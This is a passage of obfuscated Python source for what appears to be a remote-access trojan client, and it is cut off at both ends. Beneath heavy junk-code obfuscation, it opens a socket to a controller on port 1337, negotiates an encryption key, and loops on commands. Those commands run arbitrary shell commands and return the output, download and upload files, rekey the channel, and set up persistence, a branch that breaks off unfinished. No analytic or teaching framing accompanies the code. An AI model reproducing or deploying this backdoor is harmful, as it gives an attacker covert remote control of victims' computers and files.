    elif BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL == BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL:
        for BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL in BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
            if cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU == BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
                BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL = 'cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU'
            elif BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL == cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU:
                cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU = FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU
            else:
                FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU = BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg
                for BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL in BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
                    if cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU == BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
                        BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL = 'cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU'
                    elif BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL == cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU:
                        cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU = FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU
                    else:
                        FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU = cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU
    else:
        FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU = BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg
    print(HyuxhUTajPpKCWhRkLKqqZJEgSPOedLe)
    sys.exit(0)
zqqifMQrhtPefsCttOqFsDUuLduRzNZt = sys.platform

wAHYGiRCkZaONJPnJRrsdZigNzheaLlT = 'OHJUWoXsCnnGFrVtKHmFcBZMZWjVMdnT'
QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY = 'XreAHUrCdKmwDrVBuYPNcJlDRVQNpPim'
kwjCqMNGVwDVKTCysbnGsnXZusrEiPZq = 'RuXlnFstXsSHkABkPTGMPIkQtrEmHQKP'
FRkeisMlDrSkndkjPaPkkdweFCAXFJpW = 'PiNMHQvnfcLqjpTUgwUaAewnbFXdQrTh'
yICBpUOOaWtbpTzGvRvosZAmtNWEFXBt = 'vLGnsaLyQqMtigHayIjnfpHPueHCiMxF'
if wAHYGiRCkZaONJPnJRrsdZigNzheaLlT in QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY:
    wAHYGiRCkZaONJPnJRrsdZigNzheaLlT = yICBpUOOaWtbpTzGvRvosZAmtNWEFXBt
    if QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY in kwjCqMNGVwDVKTCysbnGsnXZusrEiPZq:
        QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY = FRkeisMlDrSkndkjPaPkkdweFCAXFJpW
elif QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY in wAHYGiRCkZaONJPnJRrsdZigNzheaLlT:
    kwjCqMNGVwDVKTCysbnGsnXZusrEiPZq = QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY
    if kwjCqMNGVwDVKTCysbnGsnXZusrEiPZq in QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY:
        QELCXOSQsrxsHxYllBeyBLiuIjmJIYFY = yICBpUOOaWtbpTzGvRvosZAmtNWEFXBt
yIgOQMTSzjJkBcHnfOQNmcLGligZXnfl      = 'localhost'

wjEiCLjMoipfZTHPhKIgmccBekeouPQH = 'xIitGvbEEjWJjYglZQRbTwkKAyhBlhhm'
BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC = 'ozgDseVBbMecwQMIfTFlaGbdNTWWQjYm'
RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU = 'xTfCUxZXxUVDiuVdbFyFpPAaJVhWLODo'
FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj = 'tfbEnxqlzKyBaScOXLWFwmSvnJgKRIsp'
if BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC == wjEiCLjMoipfZTHPhKIgmccBekeouPQH:
    for wjEiCLjMoipfZTHPhKIgmccBekeouPQH in BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
        if BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC == BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
            RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU = 'FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj'
        elif RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU == FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj:
            FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj = wjEiCLjMoipfZTHPhKIgmccBekeouPQH
        else:
            wjEiCLjMoipfZTHPhKIgmccBekeouPQH = BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC
elif RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU == RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU:
    for RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU in BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
        if FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj == BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
            RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU = 'FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj'
        elif RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU == FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj:
            FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj = wjEiCLjMoipfZTHPhKIgmccBekeouPQH
        else:
            wjEiCLjMoipfZTHPhKIgmccBekeouPQH = BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC
            for RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU in BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
                if FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj == BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC:
                    RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU = 'FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj'
                elif RnHJtvNLSWZpQQcVGwhaDYqttLBSAAZU == FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj:
                    FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj = wjEiCLjMoipfZTHPhKIgmccBekeouPQH
                else:
                    wjEiCLjMoipfZTHPhKIgmccBekeouPQH = FaWVpjiCrUmgLzrxxIkJrXPKbnSefjtj
else:
    wjEiCLjMoipfZTHPhKIgmccBekeouPQH = BdyQRwRSIPGHNsHbSGVNHVUDVZSPCjUC
xMtSHBoZmDJnzoghNanxdJOaVlzbVffm      = 1337

FwPNjibaFlvqdOixtvORMvtIRuuKHfRt = 'qLqagqvkvSnoVXzhbKISKZsoqkSJClZY'
fZeZxpuTSogbqMYIsGqIGvieKvqvUhRO = 'pIQccKYBKAxmMKgZnwSkOlSVFDsMrVxV'
FrWbxEZVLbzOVFRZgzXxtzgftMHDlasR = 'naFtsesLnbGVwDSXHzqmGtkJPeeGiERh'
if FwPNjibaFlvqdOixtvORMvtIRuuKHfRt == fZeZxpuTSogbqMYIsGqIGvieKvqvUhRO:
    FrWbxEZVLbzOVFRZgzXxtzgftMHDlasR = 'naFtsesLnbGVwDSXHzqmGtkJPeeGiERh'
    FrWbxEZVLbzOVFRZgzXxtzgftMHDlasR = FwPNjibaFlvqdOixtvORMvtIRuuKHfRt
else:
    FrWbxEZVLbzOVFRZgzXxtzgftMHDlasR = 'naFtsesLnbGVwDSXHzqmGtkJPeeGiERh'
    FrWbxEZVLbzOVFRZgzXxtzgftMHDlasR = 'qLqagqvkvSnoVXzhbKISKZsoqkSJClZY'
WEYvrZXfDBbbJxZGyNyCHkMhJTSHoawx    = 'b14ce95fa4c33ac2803782d18341869f'

try:
    lJvcQhmuuhokGnKMTEEAjpQniqfhjOjZ = 'MQCEfgPdDJTkdathFRpqXwhscjnLOFra'
    kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd = 'QJEHtQHkCapRIImoYXmBfHCGMYmcYxDl'
    dgsoXzLrcDlJxaMnQTXOBrngoPccBBYC = 'UhYojRMdyCxjoYPuqLcsdjdpqRESJNLj'
    HCjwJWqFqTPKfoqVCefvMQEtKpaoUHnH = 'TlArGgqHkSuORADdPKQdJgRjDuYXVCRH'
    QoyrTifADBgDJuFTKzBxbbsQRbNgVqba = 'FPYnNojODByutUYaeMhnHBgmQzFqVbfn'
    QKuwnYtznnsvwyHGMmnTPxyuEJtskYhB = 'xwQYyCxjFRxJrTjrpxEnqySdhNYibThJ'
    BKtQupecsQcMiVEBAAKUaNZfZaivQgJc = [
            'MQCEfgPdDJTkdathFRpqXwhscjnLOFra',
            'UhYojRMdyCxjoYPuqLcsdjdpqRESJNLj',
            'FPYnNojODByutUYaeMhnHBgmQzFqVbfn',
            'iIcktZWmLDIjwtOrkAjigvobywVordfJ'
    ]
    for lJvcQhmuuhokGnKMTEEAjpQniqfhjOjZ in QKuwnYtznnsvwyHGMmnTPxyuEJtskYhB:
        for kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd in dgsoXzLrcDlJxaMnQTXOBrngoPccBBYC:
            if HCjwJWqFqTPKfoqVCefvMQEtKpaoUHnH == QoyrTifADBgDJuFTKzBxbbsQRbNgVqba:
                kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd = lJvcQhmuuhokGnKMTEEAjpQniqfhjOjZ
            elif QoyrTifADBgDJuFTKzBxbbsQRbNgVqba == kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd:
                kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd = QKuwnYtznnsvwyHGMmnTPxyuEJtskYhB
            else:
                QoyrTifADBgDJuFTKzBxbbsQRbNgVqba = QKuwnYtznnsvwyHGMmnTPxyuEJtskYhB
                for kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd in BKtQupecsQcMiVEBAAKUaNZfZaivQgJc:
                    dgsoXzLrcDlJxaMnQTXOBrngoPccBBYC = kwvGDDKuKAmbeqlTDUUOyWZoOKtyRmhd
except Exception:
    pass
def qiMWPvHvljyCdHbajcSUdpxLsWQPxUNF():
    bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv = socket.socket()
    bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.connect((yIgOQMTSzjJkBcHnfOQNmcLGligZXnfl, xMtSHBoZmDJnzoghNanxdJOaVlzbVffm))
    DETfGmKuhOglKRjePCaUWvDYeugRneWo = oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg(bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv)
    while True:

        try:
            kJMFHdsQhuiXIoFdmpLUtICDUUrsWPbm = 'VMBlRwaobLYiOgGqIekFvivlZFegfNuq'
            rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp = 'OzdhKbLaxuujixxSDBNNJPTdRpmCRcKB'
            dpIfUGWXMzQkkwIMsSHWuWxYZHKJwpxY = 'ZnZfnOLxlGglRARYBFrpULwNzCanVnmC'
            HINZturONQfZogLKYrntzdktVqkaKVbk = 'dTCEtuUYpcQnOEhwzHCkltzmXomLPEqs'
            SFmgiqnVtZuUGySONdgbeNCWfIojQtlC = 'byRbjVnSylCloeBGbOmTyyzTkLgSeSBn'
            MeUKnPxDAQxJPiXKqoyqRwwssAdPWFDT = 'STCKGuZtYulWoleLwapCTxdQlDFrHHSQ'
            vcNcDExJFLXHmydyyhRXobjnlsQlTPqy = [
                    'VMBlRwaobLYiOgGqIekFvivlZFegfNuq',
                    'ZnZfnOLxlGglRARYBFrpULwNzCanVnmC',
                    'byRbjVnSylCloeBGbOmTyyzTkLgSeSBn',
                    'meYAZJxOpjMnYzYZgptvEgmNhxqXKVRy'
            ]
            for kJMFHdsQhuiXIoFdmpLUtICDUUrsWPbm in MeUKnPxDAQxJPiXKqoyqRwwssAdPWFDT:
                for rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp in dpIfUGWXMzQkkwIMsSHWuWxYZHKJwpxY:
                    if HINZturONQfZogLKYrntzdktVqkaKVbk == SFmgiqnVtZuUGySONdgbeNCWfIojQtlC:
                        rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp = kJMFHdsQhuiXIoFdmpLUtICDUUrsWPbm
                    elif SFmgiqnVtZuUGySONdgbeNCWfIojQtlC == rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp:
                        rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp = MeUKnPxDAQxJPiXKqoyqRwwssAdPWFDT
                    else:
                        SFmgiqnVtZuUGySONdgbeNCWfIojQtlC = MeUKnPxDAQxJPiXKqoyqRwwssAdPWFDT
                        for rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp in vcNcDExJFLXHmydyyhRXobjnlsQlTPqy:
                            dpIfUGWXMzQkkwIMsSHWuWxYZHKJwpxY = rxRPyOOTIgsJUKyNzGYALfKOlnmxvMSp
        except Exception:
            pass
        yFYhKZlHMDLlZSSiqdlciYMnPiKpwfbo = bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.recv(1024)
        yFYhKZlHMDLlZSSiqdlciYMnPiKpwfbo = VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA(yFYhKZlHMDLlZSSiqdlciYMnPiKpwfbo, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
        gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr, _, action = yFYhKZlHMDLlZSSiqdlciYMnPiKpwfbo.partition(' ')
        if gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'quit':

            ciCWEXiwzmlWMhrBRiyRCZzZlPZegnXp = 'NiGjCEQAlxsLZlZNPBhPQsxaGwjDcLtj'
            TPzqpktJUifHCfZcvEERfvjXBOzCAwMW = 'UmtupyubceUSIYlHlhxiceaUextpZkzn'
            rzYgswYZRWPGJZQgVGhQHwfIINtYAdvD = 'pNFySaburNOxZBuKFBlRRMlxErOSTUkc'
            nWEsniNyhqGLegiOVppovgCjkMtSmVQT = 'RhVziLyjciMimfOaMhHZhEXUUaMSTwbL'
            yUQuhRHmbnpLoVYGQdLkxpqpvzRmZYeT = 'YpdRNtUXHfKDtrIUWEjmitPANLsokpsx'
            if ciCWEXiwzmlWMhrBRiyRCZzZlPZegnXp in TPzqpktJUifHCfZcvEERfvjXBOzCAwMW:
                ciCWEXiwzmlWMhrBRiyRCZzZlPZegnXp = yUQuhRHmbnpLoVYGQdLkxpqpvzRmZYeT
                if TPzqpktJUifHCfZcvEERfvjXBOzCAwMW in rzYgswYZRWPGJZQgVGhQHwfIINtYAdvD:
                    TPzqpktJUifHCfZcvEERfvjXBOzCAwMW = nWEsniNyhqGLegiOVppovgCjkMtSmVQT
            elif TPzqpktJUifHCfZcvEERfvjXBOzCAwMW in ciCWEXiwzmlWMhrBRiyRCZzZlPZegnXp:
                rzYgswYZRWPGJZQgVGhQHwfIINtYAdvD = TPzqpktJUifHCfZcvEERfvjXBOzCAwMW
                if rzYgswYZRWPGJZQgVGhQHwfIINtYAdvD in TPzqpktJUifHCfZcvEERfvjXBOzCAwMW:
                    TPzqpktJUifHCfZcvEERfvjXBOzCAwMW = yUQuhRHmbnpLoVYGQdLkxpqpvzRmZYeT
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.close()
            sys.exit(0)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'run':

            sdkSisJFgLYjjYXLaoIYZMPWTdZvgLbu = 'YcOSVqJnOPjmrMbxjxacBlJFjLzvaGXb'
            reEtXkQeJunLzJejiTpDbqtNLVwQXLTN = 'PmQjwSRjoLKCHTgJNKprHpuQAieZcmRd'
            TKEOJMbBHDmAiZFLxNeMUeEtjZUfeqeE = 'uREKEjyRZDwOUZpegOYBCQBwHBROgvnV'
            IQWSIeVfPaIKnzNprLIToifepoogZxsa = 'uDfHQchkWIeWmfxycdllBGcWRCzHKcvh'
            NYdeYQCmZaswZAhQacFGfKFHIiwlUWpv = 'gTOoisicvGDrRcMJKFLbSSbpbAowplLw'
            if sdkSisJFgLYjjYXLaoIYZMPWTdZvgLbu in reEtXkQeJunLzJejiTpDbqtNLVwQXLTN:
                sdkSisJFgLYjjYXLaoIYZMPWTdZvgLbu = NYdeYQCmZaswZAhQacFGfKFHIiwlUWpv
                if reEtXkQeJunLzJejiTpDbqtNLVwQXLTN in TKEOJMbBHDmAiZFLxNeMUeEtjZUfeqeE:
                    reEtXkQeJunLzJejiTpDbqtNLVwQXLTN = IQWSIeVfPaIKnzNprLIToifepoogZxsa
            elif reEtXkQeJunLzJejiTpDbqtNLVwQXLTN in sdkSisJFgLYjjYXLaoIYZMPWTdZvgLbu:
                TKEOJMbBHDmAiZFLxNeMUeEtjZUfeqeE = reEtXkQeJunLzJejiTpDbqtNLVwQXLTN
                if TKEOJMbBHDmAiZFLxNeMUeEtjZUfeqeE in reEtXkQeJunLzJejiTpDbqtNLVwQXLTN:
                    reEtXkQeJunLzJejiTpDbqtNLVwQXLTN = NYdeYQCmZaswZAhQacFGfKFHIiwlUWpv
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = VCiTfAhlorMIlNVLauEPZyCIMIJODOxX.stdout.read() + VCiTfAhlorMIlNVLauEPZyCIMIJODOxX.stderr.read()
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.sendall(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'download':

            zoMeAemVFtDbFHgntmWLaJhhAAcTqqbW = 'exgIIEWdqITncQEyFOKfvxiPAyLBFYQb'
            nTKQQolWXCWoNZjvHqFGeuBFBPUJbpGR = 'mjIPvphDdiQFZrZVFDtnXolWFYlgHphf'
            etQKxvUqtJKnvLuOQyNITRclIrjVuFIn = 'ymnoDRTtbdzrnUWVhkXJAuZcKXYsubXW'
            VZbDnnDWkUWcNaLkhfNJgMAEoeWZDoJC = 'fZlyesNkSORzZdSGQcCRQYZURcQRcKnY'
            OSlnFcOeQaewkGhZMFScAnzXhmdcsvGe = 'BIFkyDpAhWmKNEjkFKvQcArdjJJYjGLX'
            slPpSdiZFVdYUwnxmWGwLzEKqohYqWii = 'LLJgLkTUdqYTChBJLHFgthfzJKOjBoAs'
            if etQKxvUqtJKnvLuOQyNITRclIrjVuFIn == VZbDnnDWkUWcNaLkhfNJgMAEoeWZDoJC:
                for slPpSdiZFVdYUwnxmWGwLzEKqohYqWii in OSlnFcOeQaewkGhZMFScAnzXhmdcsvGe:
                    if slPpSdiZFVdYUwnxmWGwLzEKqohYqWii == VZbDnnDWkUWcNaLkhfNJgMAEoeWZDoJC:
                        OSlnFcOeQaewkGhZMFScAnzXhmdcsvGe = zoMeAemVFtDbFHgntmWLaJhhAAcTqqbW
                    else:
                        VZbDnnDWkUWcNaLkhfNJgMAEoeWZDoJC = nTKQQolWXCWoNZjvHqFGeuBFBPUJbpGR
            for WUetfBAbhvHorsheRaCajunshIBsTtEY in action.split():

                goCFExYNrGBvnPdFYNUlgPfcgQPYkOBS = 'DupjjMWOIXwscstbdRAmXVMvEkhaJpCS'
                vXaRrObKJfcwAuDgzisxtERfcwCrMSoi = 'SqXTqjUqBlneQvPnMHahSuRLzUJIfShV'
                bDEqNoJcTVVmrtlCghKLKAtgJlCJrsVq = 'uUrEPiUbQGUzSpjAAoaBLBFPbBHkTCfV'
                JRFAMdtOelNLELNTGjRzFAgSUZQtswxN = 'DQbNqVfPajvnmUiVbUSpCOCHGIhClgqn'
                vdYoBmSuKkdeZURpyaHcTCLUAjnqigxi = 'ctGYrYUJkBVRQvPQbNoEHTEtxBsumOxW'
                if goCFExYNrGBvnPdFYNUlgPfcgQPYkOBS in vXaRrObKJfcwAuDgzisxtERfcwCrMSoi:
                    goCFExYNrGBvnPdFYNUlgPfcgQPYkOBS = vdYoBmSuKkdeZURpyaHcTCLUAjnqigxi
                    if vXaRrObKJfcwAuDgzisxtERfcwCrMSoi in bDEqNoJcTVVmrtlCghKLKAtgJlCJrsVq:
                        vXaRrObKJfcwAuDgzisxtERfcwCrMSoi = JRFAMdtOelNLELNTGjRzFAgSUZQtswxN
                elif vXaRrObKJfcwAuDgzisxtERfcwCrMSoi in goCFExYNrGBvnPdFYNUlgPfcgQPYkOBS:
                    bDEqNoJcTVVmrtlCghKLKAtgJlCJrsVq = vXaRrObKJfcwAuDgzisxtERfcwCrMSoi
                    if bDEqNoJcTVVmrtlCghKLKAtgJlCJrsVq in vXaRrObKJfcwAuDgzisxtERfcwCrMSoi:
                        vXaRrObKJfcwAuDgzisxtERfcwCrMSoi = vdYoBmSuKkdeZURpyaHcTCLUAjnqigxi
                WUetfBAbhvHorsheRaCajunshIBsTtEY = WUetfBAbhvHorsheRaCajunshIBsTtEY.strip()
                ehRKSVQWUJyNRXJlOKfRDOvOWCanPXzl(bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv, WUetfBAbhvHorsheRaCajunshIBsTtEY, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'upload':

            iCpFJKTvDJdwJlizUZlfeLZcgVHvhSjH = 'RYhDKBfKHVrjatuZaSePKuTJWfUalGAM'
            mTYPlztvGrdtAQhhIOicqXVTwsaVfITI = 'PZJtRZzTlkenERnaQwOukXBnZvzexlUy'
            KdfmYMUBmqLJTauFzEYZEWzDyEAIadpo = 'HIDrOOmRxMtcYAKCwBiHjGvduNJGMafQ'
            if iCpFJKTvDJdwJlizUZlfeLZcgVHvhSjH == mTYPlztvGrdtAQhhIOicqXVTwsaVfITI:
                KdfmYMUBmqLJTauFzEYZEWzDyEAIadpo = 'HIDrOOmRxMtcYAKCwBiHjGvduNJGMafQ'
                KdfmYMUBmqLJTauFzEYZEWzDyEAIadpo = iCpFJKTvDJdwJlizUZlfeLZcgVHvhSjH
            else:
                KdfmYMUBmqLJTauFzEYZEWzDyEAIadpo = 'HIDrOOmRxMtcYAKCwBiHjGvduNJGMafQ'
                KdfmYMUBmqLJTauFzEYZEWzDyEAIadpo = 'RYhDKBfKHVrjatuZaSePKuTJWfUalGAM'
            for WUetfBAbhvHorsheRaCajunshIBsTtEY in action.split():

                UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW = 'hAgJPPExDgGitKjCGmOGxpZVsXFmsJel'
                BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy = 'FiqWXofdZcOTxlyntyThvckSHpvkevAe'
                ItvMxtedgWUimGWAlCUStoedTFuFFXGb = 'pJqUudsfzYeGUxxJjjLKqXIElqyBXzkD'
                RkWPEKypMxnWwcgCmJijHARJxAfPjokl = 'SFUrXAdfbgdGInPveKRzyeCOxVXDnncW'
                if BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy == UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW:
                    for UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW in BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                        if BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy == BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                            ItvMxtedgWUimGWAlCUStoedTFuFFXGb = 'RkWPEKypMxnWwcgCmJijHARJxAfPjokl'
                        elif ItvMxtedgWUimGWAlCUStoedTFuFFXGb == RkWPEKypMxnWwcgCmJijHARJxAfPjokl:
                            RkWPEKypMxnWwcgCmJijHARJxAfPjokl = UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW
                        else:
                            UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW = BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy
                elif ItvMxtedgWUimGWAlCUStoedTFuFFXGb == ItvMxtedgWUimGWAlCUStoedTFuFFXGb:
                    for ItvMxtedgWUimGWAlCUStoedTFuFFXGb in BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                        if RkWPEKypMxnWwcgCmJijHARJxAfPjokl == BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                            ItvMxtedgWUimGWAlCUStoedTFuFFXGb = 'RkWPEKypMxnWwcgCmJijHARJxAfPjokl'
                        elif ItvMxtedgWUimGWAlCUStoedTFuFFXGb == RkWPEKypMxnWwcgCmJijHARJxAfPjokl:
                            RkWPEKypMxnWwcgCmJijHARJxAfPjokl = UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW
                        else:
                            UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW = BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy
                            for ItvMxtedgWUimGWAlCUStoedTFuFFXGb in BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                                if RkWPEKypMxnWwcgCmJijHARJxAfPjokl == BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy:
                                    ItvMxtedgWUimGWAlCUStoedTFuFFXGb = 'RkWPEKypMxnWwcgCmJijHARJxAfPjokl'
                                elif ItvMxtedgWUimGWAlCUStoedTFuFFXGb == RkWPEKypMxnWwcgCmJijHARJxAfPjokl:
                                    RkWPEKypMxnWwcgCmJijHARJxAfPjokl = UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW
                                else:
                                    UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW = RkWPEKypMxnWwcgCmJijHARJxAfPjokl
                else:
                    UqnsxlgkehnaLGTUzEkpOZeAMjOyOhdW = BnbzzDQCiQpsbyDSdNRoGfsmenUcsrWy
                WUetfBAbhvHorsheRaCajunshIBsTtEY = WUetfBAbhvHorsheRaCajunshIBsTtEY.strip()
                UKljRqYmyRjdhxzdwCmbaZADNXeYjPzg(bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv, WUetfBAbhvHorsheRaCajunshIBsTtEY, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'rekey':

            fAaflWVOIOpbgPZuZiuohedpQhJFvXap = 'RltHpPrzqZcgWaNbumFiaMmizHeDBYfe'
            yqNZXJkwojIUrQSLFQAuQPQwTopuRuFJ = 'sCIfJsTVsbbrMqJUSJYtYWhUtUYJBqQt'
            XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv = 'JvRxRCOroHovJHOpbWaAKnPEKfTZqUgD'
            WVnGCsnRDTqXqMwEmwTPsOXxEGfGfHNf = 'BxUYaMTRPLRrxspnIktIjzYgJxcMMMXX'
            bKhVXHgifiuWVXAAFQYwFUyHoftTskeu = 'thDtazIypxtktNBUyACWDeeKzbnRFDat'
            XTCVdWhUjcFekBtOsIovfzyYpmJOqcDu = 'rdQuxJHAQDgtNNkUDxbrvoqOqflXFEhj'
            if fAaflWVOIOpbgPZuZiuohedpQhJFvXap != WVnGCsnRDTqXqMwEmwTPsOXxEGfGfHNf:
                yqNZXJkwojIUrQSLFQAuQPQwTopuRuFJ = XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv
                for XTCVdWhUjcFekBtOsIovfzyYpmJOqcDu in WVnGCsnRDTqXqMwEmwTPsOXxEGfGfHNf:
                    if XTCVdWhUjcFekBtOsIovfzyYpmJOqcDu != XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv:
                        yqNZXJkwojIUrQSLFQAuQPQwTopuRuFJ = yqNZXJkwojIUrQSLFQAuQPQwTopuRuFJ
                    else:
                        bKhVXHgifiuWVXAAFQYwFUyHoftTskeu = fAaflWVOIOpbgPZuZiuohedpQhJFvXap
            else:
                XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv = fAaflWVOIOpbgPZuZiuohedpQhJFvXap
                fAaflWVOIOpbgPZuZiuohedpQhJFvXap = bKhVXHgifiuWVXAAFQYwFUyHoftTskeu
                if XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv == fAaflWVOIOpbgPZuZiuohedpQhJFvXap:
                    for XTCVdWhUjcFekBtOsIovfzyYpmJOqcDu in fAaflWVOIOpbgPZuZiuohedpQhJFvXap:
                        if XTCVdWhUjcFekBtOsIovfzyYpmJOqcDu == XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv:
                            XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv = fAaflWVOIOpbgPZuZiuohedpQhJFvXap
                        else:
                            XwirjFHZIIJMNMLwKwCxGPXUzrEtBKUv = bKhVXHgifiuWVXAAFQYwFUyHoftTskeu
            DETfGmKuhOglKRjePCaUWvDYeugRneWo = oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg(bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'persistence':

            try:
                APqAxaeYAmWGDVOeBUZaHQIxdnltBxQx = 'zfWgqZCBzfqGPSDQtnLLNPjmbprzQhgd'
                MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT = 'zTPdihezrZCxerZcklypYniXkNbneCip'
